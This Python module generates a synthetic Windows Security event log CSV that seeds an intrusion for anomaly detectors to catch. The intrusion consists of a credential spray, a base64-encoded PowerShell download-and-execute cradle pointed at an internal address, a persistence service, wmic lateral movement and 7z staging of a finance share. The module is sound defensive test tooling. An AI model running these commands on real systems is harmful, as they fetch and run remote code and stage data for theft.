"""Windows Security channel, shaped like an EVTX-derived Plaso CSV export.

Baseline: ordinary logon churn, process creation from a small software
vocabulary, and a stable set of service installs. The intrusion adds a
credential spray, an encoded-PowerShell process creation, a never-before-seen
service install for persistence, and wmic lateral movement.

Only ``datetime``, ``timestamp_desc``, ``message`` and ``source`` are consumed
as event fields by the CSV parser; every other column lands in the event's
attributes, which is where the detectors look.
"""

from __future__ import annotations

import csv
from collections.abc import Iterator
from datetime import timedelta
from pathlib import Path

from tools.demo_case import scenario

WINDOWS_HEADER: tuple[str, ...] = (
    "datetime",
    "timestamp_desc",
    "source",
    "message",
    "event_id",
    "computer_name",
    "user",
    "logon_type",
    "process_name",
    "command_line",
    "service_name",
)

#: Service installs present throughout the baseline. Value novelty needs a
#: stable prior set for the malicious one to stand out against.
BASELINE_SERVICES = ("WSearchHelper", "DellUpdateSvc", "PrintSpoolerAux", "EDRSensor")
PERSISTENCE_SERVICE = "WinSysHealthSvc"

ENCODED_COMMAND = (
    "powershell.exe -nop -w hidden -enc "
    "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
    "LgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMwAwAA=="
)
#: The 'о' in "repоrt" is Cyrillic (U+043E) — the charset-novelty signal, and
#: the kind of thing an analyst only catches because a tool flagged it.
STAGED_ARCHIVE = "Q4_repоrt_archive.7z"

_BASELINE_PROCESSES = (
    ("chrome.exe", "chrome.exe --profile-directory=Default"),
    ("outlook.exe", "outlook.exe /recycle"),
    ("teams.exe", "teams.exe --process-start-args"),
    ("svchost.exe", "svchost.exe -k netsvcs -p"),
    ("python.exe", "python.exe C:\\tools\\report_export.py"),
    ("msiexec.exe", "msiexec.exe /i C:\\deploy\\agent.msi /qn"),
    ("explorer.exe", "explorer.exe"),
    ("excel.exe", "excel.exe /dde"),
)


def _fmt(moment) -> str:
    return moment.isoformat()


def _row(
    moment,
    event_id: str,
    message: str,
    computer_name: str = "",
    user: str = "",
    logon_type: str = "",
    process_name: str = "",
    command_line: str = "",
    service_name: str = "",
) -> dict[str, str]:
    return {
        "datetime": _fmt(moment),
        "timestamp_desc": "Content Modification Time",
        "source": "EVT",
        "message": message,
        "event_id": event_id,
        "computer_name": computer_name,
        "user": user,
        "logon_type": logon_type,
        "process_name": process_name,
        "command_line": command_line,
        "service_name": service_name,
    }


def _home_hosts() -> dict[str, tuple[str, ...]]:
    """Each account's habitual workstations.

    The contractor has exactly one, which is what makes every other host they
    appear on during the intrusion a new (user, host) pair.
    """
    r = scenario.rng("windows-homes")
    homes: dict[str, tuple[str, ...]] = {}
    for user in scenario.USERS:
        if user == scenario.COMPROMISED_USER:
            homes[user] = (scenario.COMPROMISED_HOME_WORKSTATION,)
        elif user.startswith("svc_"):
            homes[user] = tuple(r.sample(scenario.SERVERS, 2))
        else:
            homes[user] = tuple(r.sample(scenario.WORKSTATIONS, r.choice((1, 2))))
    return homes


def _baseline_logons() -> Iterator[dict[str, str]]:
    """Logon success/failure/privilege churn across the whole window."""
    r = scenario.rng("windows-logons")
    homes = _home_hosts()
    humans = [u for u in scenario.USERS if not u.startswith("svc_")]
    for moment in scenario.walk(scenario.SCENARIO_START, scenario.SCENARIO_END, 3100, r):
        user = r.choice(humans) if r.random() < 0.85 else r.choice(scenario.USERS)
        host = r.choice(homes[user])
        draw = r.random()
        if draw < 0.88:
            yield _row(
                moment,
                "4624",
                f"An account was successfully logged on. Account Name: {user}",
                computer_name=host,
                user=user,
                logon_type=str(r.choice((2, 3, 7, 10))),
            )
        elif draw < 0.96:
            yield _row(
                moment,
                "4625",
                f"An account failed to log on. Account Name: {user}",
                computer_name=host,
                user=user,
                logon_type="3",
            )
        else:
            yield _row(
                moment,
                "4672",
                f"Special privileges assigned to new logon. Account Name: {user}",
                computer_name=host,
                user=user,
                logon_type="3",
            )


def _baseline_process_creation() -> Iterator[dict[str, str]]:
    """Everyday process creation from a small, stable software vocabulary."""
    r = scenario.rng("windows-processes")
    homes = _home_hosts()
    humans = [u for u in scenario.USERS if not u.startswith("svc_")]
    for moment in scenario.walk(scenario.SCENARIO_START, scenario.SCENARIO_END, 750, r):
        user = r.choice(humans)
        host = r.choice(homes[user])
        process, command = r.choice(_BASELINE_PROCESSES)
        yield _row(
            moment,
            "4688",
            f"A new process has been created. Process Name: {process}",
            computer_name=host,
            user=user,
            process_name=process,
            command_line=command,
        )


def _baseline_service_installs() -> Iterator[dict[str, str]]:
    """Roughly two service installs a week, drawn only from the known set."""
    r = scenario.rng("windows-services")
    moment = scenario.SCENARIO_START + timedelta(hours=9)
    while moment < scenario.SCENARIO_END:
        service = r.choice(BASELINE_SERVICES)
        host = r.choice(scenario.WORKSTATIONS + scenario.SERVERS)
        yield _row(
            moment,
            "7045",
            f"A service was installed in the system. Service Name: {service}",
            computer_name=host,
            user="SYSTEM",
            service_name=service,
        )
        moment += timedelta(days=3.5, hours=r.uniform(-6, 6))


def _spray() -> Iterator[dict[str, str]]:
    """The credential spray: every account tried, one succeeds.

    Dense failed logons against a domain controller, then the single 4624 that
    matters. This is the volume spike, the (user, host) novelty and the front
    of the never-seen sequence, all from one action.
    """
    r = scenario.rng("windows-spray")
    phase = scenario.PHASES[0]
    moment = phase.start + timedelta(hours=2, minutes=14)
    for _ in range(30):
        for user in scenario.USERS:
            for _ in range(10):
                yield _row(
                    moment,
                    "4625",
                    f"An account failed to log on. Account Name: {user}",
                    computer_name="DC-01",
                    user=user,
                    logon_type="3",
                )
                moment += timedelta(seconds=r.uniform(0.2, 1.1))
    yield _row(
        moment + timedelta(seconds=9),
        "4624",
        f"An account was successfully logged on. Account Name: {scenario.COMPROMISED_USER}",
        computer_name="DC-01",
        user=scenario.COMPROMISED_USER,
        logon_type="3",
    )


def _foothold() -> Iterator[dict[str, str]]:
    """Logon, encoded PowerShell, service install — in that order, minutes apart.

    Detector §9 scores the *ordering*, so the gaps stay short and the sequence
    appears nowhere in the baseline.
    """
    phase = scenario.PHASES[1]
    start = phase.start + timedelta(hours=1, minutes=6)
    yield _row(
        start,
        "4624",
        f"An account was successfully logged on. Account Name: {scenario.COMPROMISED_USER}",
        computer_name=scenario.JUMP_HOST,
        user=scenario.COMPROMISED_USER,
        logon_type="10",
    )
    yield _row(
        start + timedelta(minutes=2, seconds=41),
        "4688",
        "A new process has been created. Process Name: powershell.exe",
        computer_name=scenario.JUMP_HOST,
        user=scenario.COMPROMISED_USER,
        process_name="powershell.exe",
        command_line=ENCODED_COMMAND,
    )
    yield _row(
        start + timedelta(minutes=3, seconds=58),
        "7045",
        f"A service was installed in the system. Service Name: {PERSISTENCE_SERVICE}",
        computer_name=scenario.JUMP_HOST,
        user="SYSTEM",
        service_name=PERSISTENCE_SERVICE,
    )
    # A second copy of the beacon service two days later, on the file server.
    yield _row(
        scenario.PHASES[2].start + timedelta(hours=4, minutes=12),
        "7045",
        f"A service was installed in the system. Service Name: {PERSISTENCE_SERVICE}",
        computer_name=scenario.FILE_SERVER,
        user="SYSTEM",
        service_name=PERSISTENCE_SERVICE,
    )


def _lateral() -> Iterator[dict[str, str]]:
    """Movement onto hosts the contractor has never touched, then staging."""
    r = scenario.rng("windows-lateral")
    phase = scenario.PHASES[2]
    new_hosts = (scenario.FILE_SERVER, "WKS-007", "WKS-009", scenario.JUMP_HOST)
    moment = phase.start + timedelta(hours=3)
    for host in new_hosts:
        for _ in range(r.randint(3, 7)):
            yield _row(
                moment,
                "4624",
                f"An account was successfully logged on. Account Name: {scenario.COMPROMISED_USER}",
                computer_name=host,
                user=scenario.COMPROMISED_USER,
                logon_type="3",
            )
            moment += timedelta(minutes=r.uniform(4, 40))
        yield _row(
            moment,
            "4688",
            "A new process has been created. Process Name: wmic.exe",
            computer_name=host,
            user=scenario.COMPROMISED_USER,
            process_name="wmic.exe",
            command_line=f"wmic /node:{scenario.FILE_SERVER} process call create cmd.exe /c hostname",
        )
        moment += timedelta(minutes=r.uniform(20, 90))

    yield _row(
        scenario.PHASES[3].start + timedelta(minutes=37),
        "4688",
        "A new process has been created. Process Name: 7z.exe",
        computer_name=scenario.FILE_SERVER,
        user=scenario.COMPROMISED_USER,
        process_name="7z.exe",
        command_line=f"7z.exe a -mx9 D:\\staging\\{STAGED_ARCHIVE} D:\\shares\\finance",
    )


def windows_rows() -> Iterator[dict[str, str]]:
    """Yield every Windows row, ascending by timestamp."""
    rows: list[dict[str, str]] = []
    for builder in (
        _baseline_logons,
        _baseline_process_creation,
        _baseline_service_installs,
        _spray,
        _foothold,
        _lateral,
    ):
        rows.extend(builder())
    rows.sort(key=lambda r: r["datetime"])
    return iter(rows)


def write_windows_csv(path: Path) -> int:
    """Write the CSV and return the row count."""
    path.parent.mkdir(parents=True, exist_ok=True)
    written = 0
    with path.open("w", newline="", encoding="utf-8") as fh:
        writer = csv.DictWriter(fh, fieldnames=WINDOWS_HEADER)
        writer.writeheader()
        for row in windows_rows():
            writer.writerow(row)
            written += 1
    return written
